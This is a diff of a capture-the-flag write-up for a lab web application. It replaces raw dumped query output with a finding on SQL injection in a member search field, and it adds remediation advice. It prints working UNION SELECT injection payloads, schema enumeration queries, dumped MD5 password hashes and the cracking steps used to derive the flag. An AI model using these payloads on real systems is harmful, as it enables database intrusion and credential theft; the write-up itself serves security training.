@@ -1,113 +1,82 @@
-## Member_Brute_Force.db_default
-1 and 1=1 UNION SELECT username, password from Member_Brute_Force.db_default
-ID: 1 and 1=1 UNION SELECT username, password from Member_Brute_Force.db_default 
-Title: Nsa
-Url : https://fr.wikipedia.org/wiki/Programme_
+# Finding 07 - SQL injection on member searching input field
 
-ID: 1 and 1=1 UNION SELECT username, password from Member_Brute_Force.db_default 
-Title: 3bf1114a986ba87ed28fc1b5884fc2f8
-Url : root
+## Exploitability
+Very easy. Only 2 steps required : inject code in input field, then decrypt md5 using easy-to-find web tool.
 
-ID: 1 and 1=1 UNION SELECT username, password from Member_Brute_Force.db_default 
-Title: 3bf1114a986ba87ed28fc1b5884fc2f8
-Url : admin
+## Risk level/type
+OWASP top 10
+- A02:2021 – Cryptographic Failures		using md5 encryption
+- A03:2021 – Injection 					vulnerability to SQL injection
+
+## Detailed description of the exploit
+First check whether input field is protected against SQL injections by typing:
+```1 or 1=1```
+This yields 5 elements, seemingly from a SQL database. The last one being :
+
+```
+ID: 1 or 1 =1  
+First name: Flag
+Surname : GetThe
+```
+Ok, so that's already quite interesting!
 
 
-## Member_Sql_Injection.users
-### first_name, last_name
-1 and 1=1 UNION SELECT first_name, last_name from Member_Sql_Injection.users
-ID: 1 and 1=1 UNION SELECT first_name, last_name from Member_Sql_Injection.users 
-Title: Nsa
-Url : https://fr.wikipedia.org/wiki/Programme_
+Then, try more advanced SQL injection with the following two commands:
+```1 AND 1=2 UNION SELECT table_schema, table_name FROM information_schema.tables```
+and
+```1 AND 1=2 UNION SELECT table_name, column_name FROM information_schema.columns ```
+The results are copied in database_table_schema and database_table_columns files.
+At the bottom of each listing, there are fields that seem to be user-generated (the only few names not fully capitalized)
+The names can be found in the database_listing.md file.
 
-ID: 1 and 1=1 UNION SELECT first_name, last_name from Member_Sql_Injection.users 
-Title: me
-Url : one
+From this info, we try another SQL injection command :
+``` and 1=1 UNION SELECT first_name, last_name from Member_Sql_Injection.users```
+which yields the same result as the basic SQL injection try.
 
-ID: 1 and 1=1 UNION SELECT first_name, last_name from Member_Sql_Injection.users 
-Title: me
-Url : two
 
-ID: 1 and 1=1 UNION SELECT first_name, last_name from Member_Sql_Injection.users 
-Title: me
-Url : three
-
-ID: 1 and 1=1 UNION SELECT first_name, last_name from Member_Sql_Injection.users 
-Title: GetThe
-Url : Flag
-
-###  user_id, countersign
-1 and 1=1 UNION SELECT user_id, countersign from Member_Sql_Injection.users
-ID: 1 and 1=1 UNION SELECT user_id, countersign from Member_Sql_Injection.users 
-Title: Nsa
-Url : https://fr.wikipedia.org/wiki/Programme_
-
-ID: 1 and 1=1 UNION SELECT user_id, countersign from Member_Sql_Injection.users 
-Title: 2b3366bcfd44f540e630d4dc2b9b06d9
-Url : 1
-
-ID: 1 and 1=1 UNION SELECT user_id, countersign from Member_Sql_Injection.users 
-Title: 60e9032c586fb422e2c16dee6286cf10
-Url : 2
-
-ID: 1 and 1=1 UNION SELECT user_id, countersign from Member_Sql_Injection.users 
-Title: e083b24a01c483437bcf4a9eea7c1b4d
-Url : 3
-
+From this info, we try another SQL injection command :
+```1 and 1=1 UNION SELECT user_id, countersign from Member_Sql_Injection.users```
+which yields :
+```
 ID: 1 and 1=1 UNION SELECT user_id, countersign from Member_Sql_Injection.users 
 Title: 5ff9d0165b4f92b14994e5c685cdce28
 Url : 5
+```
 
-### town, country
-1 and 1=1 UNION SELECT town, country from Member_Sql_Injection.users
-ID: 1 and 1=1 UNION SELECT town, country from Member_Sql_Injection.users 
-Title: Nsa
-Url : https://fr.wikipedia.org/wiki/Programme_
-
-ID: 1 and 1=1 UNION SELECT town, country from Member_Sql_Injection.users 
-Title: France
-Url : Paris 
-
-ID: 1 and 1=1 UNION SELECT town, country from Member_Sql_Injection.users 
-Title: Finlande
-Url : Helsinki
-
-ID: 1 and 1=1 UNION SELECT town, country from Member_Sql_Injection.users 
-Title: Irlande
-Url : Dublin
-
-ID: 1 and 1=1 UNION SELECT town, country from Member_Sql_Injection.users 
-Title: 42
-Url : 42
-
-### planet, Commentaire
-1 and 1=1 UNION SELECT planet, Commentaire from Member_Sql_Injection.users
-ID: 1 and 1=1 UNION SELECT planet, Commentaire from Member_Sql_Injection.users 
-Title: Nsa
-Url : https://fr.wikipedia.org/wiki/Programme_
-
-ID: 1 and 1=1 UNION SELECT planet, Commentaire from Member_Sql_Injection.users 
-Title: Je pense, donc je suis
-Url : EARTH
-
-ID: 1 and 1=1 UNION SELECT planet, Commentaire from Member_Sql_Injection.users 
-Title: Aamu on iltaa viisaampi.
-Url : Earth
-
-ID: 1 and 1=1 UNION SELECT planet, Commentaire from Member_Sql_Injection.users 
-Title: Dublin is a city of stories and secrets.
-Url : Earth
-
+And one last SQL injection command :
+```1 and 1=1 UNION SELECT planet, Commentaire from Member_Sql_Injection.users```
+which yields :
+```
 ID: 1 and 1=1 UNION SELECT planet, Commentaire from Member_Sql_Injection.users 
 Title: Decrypt this password -> then lower all the char. Sh256 on it and it's good !
 Url : 42
+```
 
+The countersign is probably hashed with md5, as this is the previously encountered hashing algorithm.
+Let's verify it with the following website:
+https://www.md5online.org/md5-decrypt.html
 
-
-#### for user id 5
-we have the following countersign:
-5ff9d0165b4f92b14994e5c685cdce28
-if decrypt countersign with md5, it gives:
+It works ! And yields the following :
 FortyTwo
+As lowercase, it becomes:
+fortytwo
+To encrypt it with sha256, we can use the command:
+```echo -n "fortytwo" | sha256sum```
+The flag is:
+10a16d834f9b1e4068b25c4c46fe0284e99e44dceaf08098fc83925ba6310ff5
 
+## Remediation
 
+Input sanitizing is the first step.
+There are several ways to sanitize the input, depending on the code architecture (legacy).
+The first step is to use prepared statements with parameterized queries
+	-> this means that the query would not be evaluated as a command but as a string, looking for an exact match to the string (i.e. a username matching "1 or 1 = 1")
+For legacy code, you can also escape all the user input before putting it in a query.
+
+Also, md5 is now deprecated in favor of sha2 algorithms (sha256, sha512) as well as sha3 algorithms.
+
+## Additional resources
+https://cheatsheetseries.owasp.org/cheatsheets/Injection_Prevention_Cheat_Sheet.html
+
+md5 deprecation notice :
+https://www.security-database.com/detail.php?alert=VU836068
